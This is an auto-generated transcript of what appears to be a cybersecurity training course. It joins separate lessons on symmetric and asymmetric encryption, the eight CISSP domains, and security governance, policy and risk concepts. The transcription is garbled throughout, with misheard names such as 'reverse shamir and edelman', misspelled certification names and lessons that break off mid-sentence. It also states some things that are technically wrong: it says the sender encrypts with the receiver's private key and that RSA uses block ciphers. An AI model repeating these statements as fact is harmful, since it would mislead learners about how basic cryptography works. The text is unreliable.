if the sender somehow transmits the
secret key along with the cipher text
anyone can intercept the package and
access the information
consequently this encryption category is
termed private key cryptography since a
big part of the data's integrity is
riding on the promise that the users can
keep the key secret this terminology
contrasts with asymmetry key
cryptography which is called public key
cryptography because it has two
different keys at play one of which is
public
provided we managed to keep the keys
secret we still have to choose what kind
of ciphers we want to use to encrypt
this information in symmetric key
cryptography there are broadly two
categories of ciphers that we can employ
let us have a look
stream ciphers are the algorithms that
encode basic information one bit at a
time
it can change depending on the algorithm
being used but usually it's relies on a
single bit or byte to do the encryption
this is the relatively quicker
alternative considering the algorithm
doesn't have to deal with blocks of data
at a single time
every piece of data that goes into the
encryption can and needs to be converted
into binary format
in stream ciphers each binary digit is
encrypted one after the other
the most popular ones are the rc4 salsa
and panama
the binary data is passed through an
encryption key which is a randomly
generated bit stream
upon passing it through we receive the
ciphertext that can be transferred to
the receiver without fear of
man-in-the-middle attacks
the binary data can be passed through an
algorithmic function
it can have either x or operations as it
is most of the time or any other
mathematical calculations that have the
singular purpose of scrambling the data
the encryption key is generated using
the random bitstream generator and it
acts as a supplement in the algorithmic
function
the output is in binary form which is
then converted into the decimal or
hexadecimal format to give our final
ciphertext
on the other hand block ciphers dissect
the raw information into chunks of data
of fixed size
the size of these blocks depends on the
exact cipher being used a 128-bit block
cipher will break the plain text into
blocks of 128 bit each and encrypt those
blocks instead of a single digit
once these blocks are encrypted
individually they are chained together
to form a final cipher text
block ciphers are much slower but they
are more tamper-proof and are used in
some of the most widely used algorithms
employed today
just like stream ciphers the original
ciphertext is converted into binary
format before beginning the process once
the conversion is complete the blocks
are passed through the encryption
algorithm along with the encryption key
this would provide us
with the encrypted blocks of binary data
once these blocks are combined we get a
final binary string
this string is then converted into
hexadecimal format to get our ciphertext
today the most popular symmetric key
algorithms like aes des and 3des are all
block cipher methodology subsets
with so many factors coming into play
there are quite a few things symmetrical
cryptography excels at while falling
short in some other
symmetric key cryptography is much
faster variant when compared to
asymmetric key cryptography there is
only one key in play unlike asymmetric
encryption and this drastically improves
calculation speed in the encryption and
decryption
similarly the performance of symmetric
encryption is much more efficient under
similar computational limitations fewer
calculations help in better memory
management for the whole system
bulk amounts of data that need to be
encrypted are very well suited for
symmetric algorithms since they are much
quicker handling large amounts of data
is simple and easy to use in servers and
data forms this helps in better latency
during data recall and fewer mixed
packets
thanks to its simple single key
structure symmetric key cryptography
algorithms are much easier to set up a
communication channel with and offer a
much more straightforward maintenance
duties once the secret key is
transmitted to both the sender and
receiver without any prior mishandling
the rest of the system aligns easily and
everyday communications becomes easy and
secure if the algorithm is applied as
per the documentation symmetric
algorithms are very robust and can
encrypt vast amounts of data with very
less overhead in a last video on
cryptography we took a look at symmetric
key cryptography
we used a single private key for both
the encryption and decryption of data
and it works very well in theory let's
take a look at a more realistic scenario
now
let's meet joe
joe is a journalist who needs to
communicate with ryan via long distance
messaging
due to the critical nature of the
information people are waiting for any
message to leave joe's house so that
they can intercept it
now joe can easily use symmetric
cryptography to send the encrypted data
so that even if someone intercepts the
message they cannot understand what it
says
but here's the tricky part
how will joe send the required
decryption key to ryan
the sender of the message as well as the
receiver need to have the same
decryption key so that they can exchange
messages otherwise ryan cannot decrypt
the information even when he receives
the cipher text if someone intercepts
the key while transmitting it there is
no use in employing cryptography since
the third party can now decode all the
information easily
key sharing is a risk that will always
exist when symmetric key cryptography is
being used
thankfully asymmetric key encryption has
managed to fix this problem
let's understand what asymmetric key
cryptography is
asymmetric encryption uses a double
layer of protection
there are two different keys at play
here a private key and a public key
a public key is used to encrypt the
information pre-transit and a private
key is used to decrypt the data post
transit
these pair of keys must belong to the
receiver of the message the public keys
can be shared via messaging blog posts
or key servers and there are no
restrictions
as you can see in the image the two keys
are working in the system the sender
first encrypts the message using the
receiver's private key after which we
receive the ciphertext the ciphertext is
then transmitted to the receiver without
any other key on getting the ciphertext
the receiver uses his private key to
decrypt it and get the plain text back
there has been no requirement of any key
exchange throughout this process
therefore solving the most glaring flaw
faced in symmetric key cryptography
the public key known to everyone cannot
be used to decrypt the message and the
private key which can decrypt the
message need not be shared with anyone
the sender and receiver can exchange
personal data using the same set of keys
as often as possible
to understand this better take the
analogy of your mailbox
anyone who wants to send you a letter
has access to the box and can easily
share information with you
in a way you can say the mailbox is
publicly available to all but only you
have access to the key that can open the
mailbox and read the letters in it
this is how the private key comes to
play
no one can intercept the message and
read its contents since it's encrypted
once the receiver gets its contents he
can use his private key to decrypt the
information
both the public key and the private key
are generated so they are interlinked
and you cannot substitute other private
keys to decrypt the data
in another example if alice wants to
send a message to bob
let's say it reads call me today she
must use bob's public key while
encrypting the message
upon receiving the cipher message bob
can proceed to use his private key in
order to decrypt the message and hence
complete securities attained during
transmission without any need for
sharing the key
since this type of encryption is highly
secure it has many users in areas that
require high confidentiality
it is used to manage digital signature
so there is valid proof of a document's
authenticity
with so many aspects of business
transitioning to the digital sphere
critical documents need to be verified
before being considered authentic and
acted upon thanks to asymmetric
cryptography senders can now sign
documents with their private keys anyone
who needs to verify the authenticity of
such signatures can use the sender's
public key to decrypt the signature
since the public and the private keys
are linked to each other mathematically
it's impossible to repeat this
verification with duplicate keys
document encryption has been made very
simple by today's standards but the
background implementation follows a
similar approach
in blockchain architecture asymmetry key
cryptography is used to authorize
transactions and maintain the system
thanks to its two key structures changes
are reflected across the blockchain's
peer-to-peer network only if it is
approved from both ends
along with asymmetric key cryptography's
tamper-proof architecture its
non-repudiation characteristic also
helps in keeping the network stable
we can also use asymmetric key
cryptography combined with symmetrical
cryptography to monitor ssl or tls
encrypted browsing sessions to make sure
nobody can steal our personal
information when accessing banking
websites or the internet in general
it plays a significant role in verifying
websites of authenticity exchanging the
necessary encryption keys required and
generating a session using those keys to
ensure maximum security instead of the
rather insecure http website format
security parameters differ on a session
by session basis so the verification
process is consistent and utterly
essential to modern data security
another great use of the asymmetric key
cryptography structure is transmitting
keys for symmetric key cryptography with
the most significant difficulty in
symmetric encryption being key exchange
asymmetric keys can help clear the
shortcoming the original message is
first encrypted using a symmetric key
the key used for encrypting the data is
then converted into the cipher text
using the receiver's public key now we
have two cipher text to transmit to the
receiver on receiving both of them the
receiver uses his private key to decrypt
the symmetry key he can then use it to
decrypt the original information on
getting the key used to encrypt the data
while this may seem more complicated
than just asymmetry key cryptography
alone
symmetric encryption algorithms are much
more optimized for vast amounts of data
on some occasions
encrypting the key using asymmetric
algorithms will definitely be more
memory efficient and secure
you might remember us discussing why
symmetric encryption was called private
key cryptography let us understand why
asymmetric falls under the public key
cryptography
we have two keys at our disposal
the encryption key is available to
everyone
the decryption key is supposed to be
private
unlike symmetric key cryptography there
is no need to share anything privately
to have an encrypted messaging system to
put that into perspective we share an
email address with anyone looking to
communicate with us it is supposed to be
public by design so that our email login
credentials are private and they help in
preventing any data mishandling since
there is nothing hidden from the world
if they want to send us any encrypted
information this category is called the
public key cryptography
there are quite a few algorithms being
used today that follow the architecture
of asymmetric cryptography none more
famous than the rs encryption
encryption is the most widely used
encryption or public key encryption
standard using asymmetric approach
named after its founders reverse shamir
and edelman it uses block ciphers to
obscure the information
if you are unfamiliar with how block
ciphers work there are encryption
algorithms that divide the original data
into blocks of equal size
the block size depends on the exact
cipher being used
once they are broken down these blocks
are encrypted individually and later
chained together to form the final
cipher text
widely considered to be the most
secure form of encryption albeit
relatively slower than symmetric
encryption algorithms it is widely used
in web browsing secure identification
vpns emails and other chat applications
with so many variables in play there
must be some advantages that give
asymmetrically cryptography an edge over
the traditional symmetric encryption
methodologies
let's go through some of them
there is no need for any reliable key
sharing channel in asymmetric encryption
it was an added risk in private key
cryptography that has been completely
eliminated in public key architecture
the key which is made public cannot
recruit any confidential information and
the only key that can decrypt doesn't
need to be shared publicly under any
circumstance
we have much more extensive key lengths
in rsa encryption and other asymmetric
algorithms like 2048 bit key and 4096
bit keys
larger keys are much harder to break
into via brute force and are much more
secure
asymmetric key cryptography can use as a
proof of authenticity since only the
rightful owner of the keys can generate
the messages to be decrypted by the
private key the situation can also be
reversed encryption is done using a
private key and decryption is done by
the public key which would not function
if the correct private key is not used
to generate the message hence proving
the authenticity of the owner
it also has a tamper protection feature
where the message cannot be intercepted
and changed without invalidating the
private key used to encrypt the data
consequently the public key cannot
decrypt the message and it is easy to
realize the information is not 100
legitimate when and where the case
requires so let's start off this
tutorial by understanding the need for
the cisp certification if you have seen
our previous videos you would be aware
of the various cyber security
certifications like ccna comtia security
plus cism cisa and ch to name a few you
might have also come across the cssp
certification let me tell you this is
one of the toughest and most in demand
certification in the cyber security
field in the current times managing
information security in a company can be
extremely challenging with the advent of
the internet and various other
technologies there is a large exposure
to various security breaches the
presence of information security experts
in-house helps organizations manage
their i.t processes in a better way this
is where a cisp professional is in
demand by employers compared to the
other cyber security professionals the
demand for cssb certified professionals
has grown rapidly there are nearly 50
000 job postings for this same now that
you have an idea of the demand of cssp
certified professionals let's move on to
understanding what exactly is cisp cssp
stands for certified information system
security professional it is considered
the gold standard in the field of
information security this certification
is taken up by id professionals it
trains a candidate to become an
information assurance professional
taking up the cssb certification will
help you define the design architecture
controls and management of highly secure
business environments you will also be
called a cssp professional only after
you successfully pass the cssp exam so
now let's have a look into the cssp exam
requirements the primary requirement for
any candidate is that they should have
at least five years of work experience
in the field of information security in
addition to this it is also suggested
that the candidate clears other
certifications like ccna comcast
security plus ceh csm and cisa to name a
few cssp is considered as an advanced
level cyber security certification hence
it is better if the candidate clears the
basic level and the managerial level
certifications before moving to the cssp
certification as i mentioned earlier
this certification is suitable for
professionals who have a minimum of five
years of work experience professionals
working as security consultants and
managers network and security architects
i.t directors security auditors and
chief information security officers can
take up the cssp certification let's now
move on to our next topic that is cisp
domains this entire certification is
grouped into a total of eight domains
the broad spectrum of topics included in
cssp ensure its relevance across all
disciplines in the field of information
security successful candidates are
competent in the following eight domains
they are security and risk management
then we have asset security security
engineering communications and network
security followed by identity and access
management then security assessment and
testing security operations and finally
we have software development security
these eight domains deal with different
aspects of information security we will
have a look into each of these
individually and understand what each of
these domains symbolize first up we have
the security and risk management domain
as the name suggests this domain mainly
consists of the fundamentals of security
policies compliance law and regulations
professional ethics risk management and
threat modeling cyber security and
information security plays a major role
in this domain there is a difference
between cyber security and information
security which is more often missed out
on by people cybersecurity refers to
several techniques used to protect the
integrity of networks whereas
information security refers to processes
and tools deployed to protect sensitive
information to implement cybersecurity
we have a list of approaches like
compliance-based ad-hoc and risk-based
in compliance based security measures
are decided based on regulations while
in ad hoc security measures are based on
no specific criteria in risk-based
security measures are based on unique
risks depending on the organization
let's now have a look at the cia triad
here c stands for confidentiality i for
integrity and a for availability
confidentiality integrity and
availability have served as the industry
standard for computer security since the
time of the first mainframes
confidentiality means that information
and functions can be accessed only by
authorized parties for example military
secrets integrity means that information
and functions can be added altered or
removed only by authorized people and
availability means that systems
functions and data must be available on
demand now that we have understood the
cia triad let's have a look at the grc
trilogy this trilogy is a structured
approach adopted by organizations to
align it objectives with business
objectives first up we have governance
such a program has motives like ensuring
goals are achieved providing strategic
plans and so on governance is taken care
of by the senior professionals of an
organization next up we have risk
management here the organization looks
into mitigating all types of risks such
as investment physical and cyber risks
finally we have compliance as discussed
previously compliance refers to abiding
by the defined laws and regulations so
who do you all think develops a security
policy which is used to achieve the
organization's goals well it is done by
the senior management of an organization
let's have a look at the characteristics
of these security policies first and
foremost these policies should support
the vision and mission of the company
all the business units should be
integrated in these security policies
they should also be regularly updated
and finally it is important that these
security policies should be easy to
understand so that everyone can abide by
them without any problem in addition to
security policies a risk analysis team
is also formed in organization to
perform the analysis of each known risk
there are various steps to perform risk
analysis let's have a look at each of
these first the team makes an assessment
of the value of the company's assets
then there is an analysis made based on
the risks to assets and finally the team
discovers solutions to mitigate these
risks now that was all about the first
domain of cisp security and risk
management let's have a look at the
second domain asset security asset
security deals with the collection and
protection of assets such as data and
devices here we will be looking into
data classification data management data
remnants and data loss prevention so in
data classification the data owner
classifies data a data owner can be an
individual or a group of people who
created the information and are directly
responsible for it this classification
is done based on a set of predefined
criterias at the end the classification
is annually reviewed to see if there has
to be some change incorporated data
management involves managing the
information lifecycle needs of an
enterprise in an effective manner it
also ensures that the data complies to
the set standards and finally data
management also ensures data validity
and integrity moving on to data remnants
it is a term used for the residual of
digital data that is present even after
trying to erase the data data remnants
should be avoided as data should be
completely destroyed to tackle data
remnants we have methods like
overwriting and destruction to name a
few in overwriting other information is
written over the data several times so
that the original data cannot be
recovered in destruction data in the
storage device is physically damaged to
make recovery difficult asset security
also looks into data loss prevention
here several measures and risk
assessments are performed to ensure that
information is only available to
authorized users let's now move on to
our third domain security engineering as
the name suggests this domain talks
about security architecture security
models cryptography and physical
security security architecture
establishes a common practice for
creating analyzing and using
architecture description within a
particular domain security architecture
takes the help of tcb that is trusted
computing base security parameter and
reference models to implement security
cryptography is also a part of security
engineering in cryptography information
is secured by converting data from a
readable format to a non-readable format
and vice versa moving to our fourth
domain we have communications and
network security this domain is all
about network structures transmission
methods and security measures used to
achieve cia in an organization osi model
is the foundation of networking this
model that is the open systems
interconnection model osi model
describes how data is transferred from
one computer to another the osi model
consists of seven layers starting from
physical layer then data link layer
network layer transport layer session
layer presentation layer and finally
application layer in the first layer
that is physical layer transmits raw bit
stream over the physical medium then
data link layer defines the format of
data on the network network layer
provides logical addressing and it also
provides path determination using local
addressing the fourth layer that is
transport layer provides end-to-end
connections in this layer data is
transmitted using transmission protocols
including tcp and udp the session layer
maintains connections and it is also
responsible for controlling ports and
sessions the sixth layer that is a
presentation layer ensures that data is
in a usable format and finally in the
seventh layer that is the in the
application layer human computer
interaction happens here applications
can access the network services the
communications and network security
domain also talks about firewalls we can
define a firewall as a hardware or
software which is used to block the
incoming or outgoing traffic from the
internet to your computer then we also
have the ids ids is known as the
intrusion detection system this is
designed to detect unauthorized access
to a system ids is used together with a
firewall and a router moving to identity
and access management of fifth domain
let's have a look at what this domain is
all about this domain of cisp is all
about the access control identification
authorization and attacks on access
control and its counter measures to be
able to access a data set or a resource
a subject has to be identified
authenticated and authorized identity
management kerberos and access criteria
are few of the crucial fields here in
identity management through automated
means users are identified and
authenticated this domain also speaks of
kerberos an authentication protocol that
is based on symmetric key cryptography
and provides end-to-end security access
to data shouldn't be granted to anyone
and everyone in fact it should be
granted based on the level of trust and
the job role in the organization it is
also better if it is provided based on
the location and the time let's now have
a look at our sixth domain security
assessment and testing so in this domain
we will look into audit security control
assessment and testing reports as you
might have heard of the term audit it is
nothing but a repeated process wherein
an independent professional evaluates
and analyzes evidence then we have
vulnerability assessment wherein i.t
risks are identified and evaluated it
helps in identifying quantifying and
prioritizing vulnerabilities a
well-planned and executed assessment and
test strategy can provide valuable
information about risk and risk
mitigation the assessment and test is
executed by a working group called the
integrated product team testing is
performed to check the data flow between
the application and the system up next
we have the security operations domain
the seventh domain of csp is all about
investigations monitoring and logging
disaster recovery and change management
here we will look into the fields of
digital forensics incident management
and perimeter security investigation of
a computer crime is also known as
computer foreign six in digital foreign
six data is examined to identify recover
and analyze opinions about digital
information incident management works to
restore the services to normal as soon
as possible a team called the incident
response team is deployed to handle such
emergencies incidence response is
defined as a practice of detecting a
problem determining its costs minimizing
the damage resolving the problem and
documenting each step this team provides
management with sufficient information
and defends the company against future
attacks in perimeter security there is
perimeter defense which allows us to
detect and keep a check on unauthorized
physical access this field also controls
the access to the facility moving on to
our eighth and final domain we have
software development security as the
name suggests this domain talks about
security in a software development
lifecycle here we will be looking into
topics like api malware spyware adware
social engineering attacks and sql
injection attack let's start off with
the application program interface known
as api api is basically a collection of
protocols and functions used to create
applications it supports formats such as
representational state transfer rest and
simple object access protocol rest is
nothing but using the present features
of the web in a simple way and soap
which is an acronym for simple object
access protocol is a messaging protocol
for exchanging data among computers now
let's move on to malware as a security
threat malware is a term which refers to
malicious software viruses ransomware
and worms we can also call trojan virus
as a form of malware which is capable of
disguising itself as a legitimate
software
malware is basically a broad term that
refers to a variety of malicious
programs one way to protect your
software from malware is to always
double check your downloads moving on to
our next security threat spyware as the
name suggests this is a software that
typically spies on your system spyware
is also a type of malware which is used
to secretly gather information of the
victim to give it to a third party
those programs that secretly record all
that you do on your computer are called
spyware it is always advised to turn on
pop-up blockers to prevent spyware
next up we have adware adware is also
known as advertising supported software
it is a type of malware that constantly
displays ads and pop-ups some of such
ads can also gather your information at
times adware is not all that dangerous
but it is a hassle as it is a gateway to
unwanted advertising on the screen and
it can also change the browser home page
adwares are known to display unwanted
annoying advertisements on your screens
let's now have a look at social
engineering attacks it is basically the
art of manipulating people so that they
end up giving their confidential
information this attack lures victims
into handing over their confidential
data this attack takes place by tricking
the human mind the most common social
engineering attacks are fishing spear
fishing and whaling fishing attack
phishing attack is a practice wherein
the hacker usually sends fraudulent
emails which appear to be coming from a
very trusted source this is done to
install malware or to steal sensitive
data like credit card information and
various other login credentials
spear phishing attack is a variation of
phishing here the attacker targets a
specific individual or a group of people
and in wailing phishing attack wealthy
powerful and prominent individuals are
made targets moving on to our next
attack we have sql injection attack sql
injection attack is a type of code
injection attack in a database driven
website the hacker manipulates a
standard sql query it allows attackers
to tamper with the existing data here
malicious code is inserted into the sql
server to obtain information so in cissp
as with every security course we start
off with the cia triad now here cia is
confidentiality integrity and
availability so it starts off with every
security mechanism when we talk about
security and we want to keep things
secure what is it that we want to secure
it is the data of an organization that
is the most valuable asset to the
organization and that's what we want to
secure when we say that we want the data
to be secured we basically talk about
three aspects for that data the first
and the foremost that the data needs to
remain confidential the second aspect
that the trader needs to be trustworthy
and the third concept that the data
should be available to all authorized
users when and where they require it so
going back to the first point when we
say we want data to be confidential what
do we mean by that by confidentiality we
talk about that data being made
available only to authorized users after
you have authenticated them insured or
assured of their authenticity and only
then you're going to give access to that
data right so even if you go into an
organization an organization has a
hierarchy of governance right so only
certain people with certain clearances
or certain job titles can have access to
certain amount of data whereas other
people may not have access to it for
example a person working in the sales
department will not have access to data
that is accessed by the hr department
thus that's what we are looking at
classification of data and keeping it
confidential only making it available to
those people who require it when we say
trustworthiness or the integrity of that
data the integrity is where the data has
been altered modified removed deleted by
unauthorized people so we want to
prevent that which means when we say we
want the integrity intact we want to
ensure that only authorized people can
modify alter or remove data if they are
allowed to do so so that's where the
authorization and authentication comes
into the picture again and data needs to
be available for me to safeguard data i
can just lock it up in a safe throw the
safe in the depth of an ocean and say
that the data is secure because it
cannot be leaked out but that data is no
longer available to authorized users
hence the data is useless for me data
would have value when the data remains
confidential has its trustworthiness
intact and is still available to all the
users that are authorized to access it
so when we talk about security we want
these three aspects to be implemented on
any and every digital asset that the
organization has and thus once these
three points are guaranteed or at least
assured to a certain extent we can then
say that the data or that particular
asset is secured moving on let's talk
about information security information
security is the process of protecting
data and information systems so in the
cia as we talked about it when we said
what do we want to protect we want to
protect all the information assets or
the technical assets that we have from
any of the vulnerabilities that can be
identified so we want to restrict
unauthorized access and use we want to
restrict deletion accidental or
intentional if they have not been
authorized to do so modification of data
so the integrity part and destruction of
data destruction could not only be
deleting data but it could be something
like a ransomware where the data gets
encrypted so it's still there it's just
not accessible to you now information
security ensures the implementation of
these following aspects the first and
foremost comes from information security
policies which is the governance aspect
of it the policies are designed to have
a implementation of security in an
organization that helps the business
processes to be executed in a secure
manner where are these policies coming
from they come from standards or
guidelines which are globally available
and based on which we can start
developing our security policies for
example if i want to develop a security
policy in my organization i might want
to depend on frameworks like iso 27001
core bit or something similar once i
have these standards set i would come
back to procedures procedures being how
are these standards to be executed right
for example in my policies i ensured
that i want encryption of aes 256 to be
implemented or rather in the policy i
determined that we want encryption to be
implemented on a data set because based
on the classification of those data so
in my policies i would determine how the
classification is going to work how data
is going to be classified on what
parameters and thus once the data gets
classified we are going to come back to
standards where we say if it is
classified as a confidential data we
want to use encryption to protect that
data and we want aes256 to be utilized
for encryption so how do we go about it
how do we implement the encryption
that's where your procedures come into
the picture your guidelines are
troubleshooting mechanisms optional
documents so if somebody has trouble
following the procedures they might want
to go into the guidelines and see how to
troubleshoot the scenario that they are
facing baselines are basically the
minimum achievable target that you want
to go with with these policies so let's
say when i say i want to have a baseline
on a server where for the server to be
published onto the internet or to be
used in production environment it has to
meet a certain criteria which means i
can go back to the hardware and i can
say the server needs a hardware
configuration of x y and z let's say a
processor a xeon processor with 16 cores
128 gigs of ram so that's a baseline
that i need for a particular server for
it to be put into production environment
for a particular use anything above that
is acceptable but nothing should go
below that then comes the risk
management while we are implementing
these policies procedures we have those
standards in place if we face any risk
during that period or if we face any
threat or a
is identified during this period all
these terms we are going to discuss in a
little bit so when we identify
vulnerabilities or threats that's where
our wrists come into the picture the
risk management comes in saying okay
this is a risk that we have identified
and now how do we want to mitigate the
risk then the security organization
comes into the picture the day-to-day
activity of how security is to be
implemented and for all of these
procedures policies baseline standards
to be implemented to be ensured that
there are to be assured that they are
working properly we need to make our
employees aware that these policies
exist this is something that they need
to follow thus the awareness or the
security education comes into the
picture here the security education is
more focused on helping employees adhere
to the company policies and standards
rather than educating employees about
security we don't want to make everybody
a ethical hacker we just want to ensure
them or we want to assure the
organization that everybody has been
warned about policies procedures
security requirements and they are going
to follow those requirements for example
a password policy where you have to
adhere to a specific password policy to
ensure passwords are created at the same
time there is another password policy
which says that you should not share
passwords with your colleagues no matter
what so for me for my employees to
follow that i need to make them aware
that these policies exist and there are
repetitions if they do not follow these
particular policies so coming back to
the governance part what is governance
since we have been talking about it
governance ensures that the security
strategies are aligned with business
objectives and consistent with
regulations so what does it guarantee
appropriate information security
activities are being performed based on
what based on the policies that we have
created based on the standards that we
have and the baselines that we would
have created so security has to be
comparable right so if i say i have
secured against particular attacks the
attacks have to be identified
and then compared to those particular
attacks i can say i have mitigated these
activities by having specific security
controls thus i can say that i am secure
the governance aspects keeps a watch on
all the security controls to see that
those security activities are ensured
are being implemented and are performing
to the best of their abilities that's
where your governance comes into the
picture the risks being reduced so the
risk management as also comes under the
governance where you're looking at newly
identified risks and you're then
implementing security controls that
would mitigate these risks then we are
looking at information security
investments appropriately directed so
when i say i want a security control
which would be a firewall ids ips
antiviruses whatever is required it
needs to have a return on investment
which is acceptable for the organization
you don't want to spend up too much of
money in security thus creating losses
for the organization when you say a
business a business objective is always
to make money rather than lose money so
security should be a supporting feature
to the business objectives where the
services are being provided by the
business in a secure manner in such a
way that they can still have a positive
return on investment on the services
that are being provided and the
executive management can determine the
program's effectiveness this is the
major part because we have to even in
any compliances audits technical audits
we have to prove that whatever we have
implemented actually works is effective
does mitigating the risk if your
security controls are not effective then
you have just wasted a bucket load of
money and have not achieved any security
measures in your exercise moving on to
security controls security controls are
measures taken to safeguard an
information system from an attack
basically for the cia triad the
confidentiality integrity and
availability so security controls could
be administrative controls technical
controls of physical security controls
what are administrative security
controls there would be policies
procedures that we have in place so the
password policy becomes an
administrative control where the
management has made everybody aware that
the password needs to meet a particular
complexity should not be shared and thus
becomes an administrative security
control a technical security control
would be where we are implementing this
policy and thus when i try to create a
password there is a software that maps
the password to the complexity
requirements assures or ensures that the
complexity requirements have been met
and thus allows the password to be
accepted or rejects the password as the
case may be that is a security control a
physical security control maybe let's
say a cctv camera which you're going to
use to monitor people and
ensure that nothing untoward happens
it's not only against physical crime but
let's say access to a particular room
where nobody's seen tailgating
maybe monitoring a server room which is
very well secured and ensuring that
unauthorized people do not get access or
purposefully or intently do not access
that area at all times so these are the
three levels of security controls that
can be implemented to enhance the
security of an organization then we come
to security policies policies is an
overall broad statement produced by a
senior management that dictates the role
of security within the organization for
example the password policy that we
talked about it just said that it needs
to uh meet a certain complexity which is
a broad statement that is being made by
by the management saying we want to
adhere to this policy to ensure that we
do not get hacked by brute force attacks
or dictionary attacks or whatever it is
the broad statement is trying to prevent
certain attacks from happening on the
organization how it is implemented
that's where the procedures and
everything else comes into the picture
it must integrate security into all
business processes so if i start
creating a policy which shows that the
complexity should be so high that the
password should be at least 20
characters strong that would be
detrimental to the organization's health
because people may not remember those
passwords or resetting those passwords
or having technical mechanisms technical
security controls in place to implement
that kind of stringent security may be
too expensive to have so whatever
policies are created they need to be in
in line with the business processes as
well the policy must be reviewed and
modified periodically or as company
changes so as and when the company
becomes more mature and can have more
levels of security they must look at
their policies again and redefine them
or as a company grows or changes market
scenarios or changes business processes
these policies may become redundant so
you want to look at those policies and
implement newer policies or modify the
existing policies to suit the business
processes in a better manner it must
support vision and mission of the
organization a business once established
will always have a long-term vision for
example the e-tailer example that we are
talking about for me to open a e-tailer
e-retailing website i don't want it to
be periodic i don't want it to be for a
month or something like that i want to
achieve success in that factor and i
want to create a plan of where i want to
reach let's say in the next five years
so how do i achieve that that's
something that i need to plan as a
business plan all my security mechanisms
that are in place should be in alignment
with the business plans business visions
across the number of years that we have
envisaged the business to perform so
that's where the policies come into the
picture policies are always long-term
not short-term documents but need to be
periodically reviewed and modified as
the business grows or business changes
its posture then looking at compliance
compliance means confirming to a rule
such as a specification policy standard
or law so we have looked at compliance
from a perspective where we talked about
iso 27001 or pci
or those frameworks now these are not
laws but these are standards of
frameworks that have been created over a
period of time through experience and
these are targeted towards organizations
towards specific industries for example
pci dss is only towards finance
organizations where they have payment
gateways in place the iso 27001 is a
more generic policy which can be
implemented by various organizations
hipaa health insurance portability and
accountability act is an american act
that talks about health related data of
its citizens so these are compliances
these may not be laws but you need to
adhere to these to be effective and to
be
allowed to conduct business in that
particular industry then we have code of
ethics code of ethics state safety of
the commonwealth duty to our principles
and to each other requires that we
adhere and be seen to adhere to the
highest ethical standards of behavior
therefore strict adherence to this code
is a condition of certification what are
the ethics protect society the
commonwealth and the infrastructure act
honorably honestly justly responsibly
responsibility and legally prove
diligent and competent service to the
principles advance and profession now
the code of ethics are codes created by
iic square for the cissp professional
and you need to adhere to these codes if
they identify violation of these codes
from any member they would d bar the
member strip them of the certification
and even blacklist them to based on
whatever
ethics they have
violated so even before the exam you
have to go through the code of ethics
you have to accept the code of ethics in
the exam you may get get up to five to
six questions just on code of ethics
then comes the legal systems uh that's
where the law comes into the picture law
could differ from country to country or
from region to region and thus depending
on which country you're in you may need
to be aware of those laws of those
countries as far as the issp is
concerned ise square is concerned they
are an american organization so they
would talk about mostly american laws
and a few european laws or directives as
well so there are three different laws
that we talk about civil common and
religious laws depends on the country
the culture of that particular country
the information security professional
should understand the different legal
systems followed internationally so you
also may come across the classification
as civil law criminal law and law of
torts civil law is basically a law where
let's say a contract has been breached
and it's not criminal in nature you just
want to sue an organization for breach
of contract criminal law is where
something criminal has happened under
the particular act of that particular
country like let's say a murder or
an attack that has happened a physical
attack or something got stolen and the
third one was the law of torch where
it's more of a compensatory law where
you can file a case a civil suit demand
compensation in lieu of the wrongs that
have happened to that particular
organization or that individual then
comes the personal security the person
the other people inside the organization
need access to data to complete their
assigned work and hence have the
potential to misuse these privileges and
thus you should have personal security
as well now when we talk about hiring
practices for people most of the
organizations perform background checks
and we get confused why these background
checks are being done the background
checks are essential to the health of
the organization where you are ensuring
that the person is not a malicious
person
has the prerequisite certifications or
the qualifications have never been
debarred or have never been prosecuted
do not have a criminal background thus
preventing physical attacks on the
organization for example a competitor
may attempt to place in your
organization a spy to spy uh to gather
information on the secrets of that
organization and report it back to the
competitor a background check may reveal
that this person was previously employed
by a competitor and thus you might want
to verify that how that employment got
terminated when did it get terminated or
is this person misusing anything or
misrepresenting uh any aspect of his or
their life then you also need to get
confidentiality agreements signed with
them for example ndas non-disclosure
agreements data that is being shared
with them the ownership of that
particular data and what are the
repercussions if that confidentiality is
breached by that particular person
conflict of interest agreements for
positions handling competitive
information as you go higher up in the
organization you might come across
contracts where it prohibits a
particular person in engaging and act
into the same activity with a competitor
for a particular period of time so if
there's a conflict of interest when
you're hiring a person where they have
signed and such a agreement with another
competitor or another organization you
don't want to embroil yourself in a
lawsuit where
the other organization may sue you for
hiring a person while they were still
under that particular contract so it's
not only to look at the background of
these people but to safeguard the
organization from any lawsuits or any
violations of contract as well get the
non-complete agreements for the
positions in charge of unique corporate
processes that again goes on to say if
you're going to leave the organization
you cannot start up a competing business
similar to the organization's business
and so on so forth now let's come back
to the technical aspect and start
talking about vulnerability threats and
risk now what is a vulnerability it is
nothing but a weakness in a system or a
process implies the absence of a
countermeasure vulnerability is internal
and is more easily managed so it's uh
basically a flaw or a misconfiguration
or a design flaw or
something like using defaults username
passwords configurations where if that
particular flaw is misused it will lead
into a security event on that particular
device for that particular organization
so when we say a security event it has
to be detrimental in nature so if
somebody is using a weak password that
can easily be cracked that is a
vulnerability where you have identified
a weak password and then you want to
prevent that vulnerability by imposing a
security control or a counter measure
the security control here starts off
with the policy of having a robust
security policy where a password policy
comes in that describes the complexity
of a particular password and then you
talk about a technical countermeasure
where you have implemented an identity
and access management plan which would
ensure that the person creating that
password adheres to the complexity of
that particular policy then a threat the
threat is the possibility that the
vulnerability might be exploited which
will result in loss so if somebody has
created a weak password and it has been
allowed that's a vulnerability which can
be exploited by the usage of brute force
attacks or
dictionary based attacks to crack
passwords if the password is cracked
somebody unauthorized may get access to
that data thus resulting in a loss for
that organization so the threat is the
possibility of that particular
vulnerability being exploited and then
comes the risk the risk is basically the
likelihood of that attack being
happening so i have a weak password it
can be exploited by a brute forcer
dictionary attack the likelihood of that
attack is what determines the risk level
for me now the likelihood will always be
hypothetical but we don't want to run
helter skelter and we do not want to
take the possibility to extreme so
that's where your business processes
come into the picture your security
policies come into the picture based on
the business processes and the policies
implemented if i have a weak password
what would be the loss that i would face
for that particular person for example a
fresher coming into an organization
having a weak password but having
limited access to
data would have a lesser risk because of
the loss being lesser than a ceo of an
organization using a weak password and
thus getting exploited because the ceo
will have access to more proprietary
data that if uh gets into the
competitor's hand would lead in huge
losses thus the same risk of having a
password cracked for a fresher will have
a lesser loss thus a lesser risk
compared to the same risk to a ceo where
the loss would be higher so a threat
could also be in multiple aspects
threats could be natural that means tour
fires flooding tornadoes anything that
is an act of god that can happen with
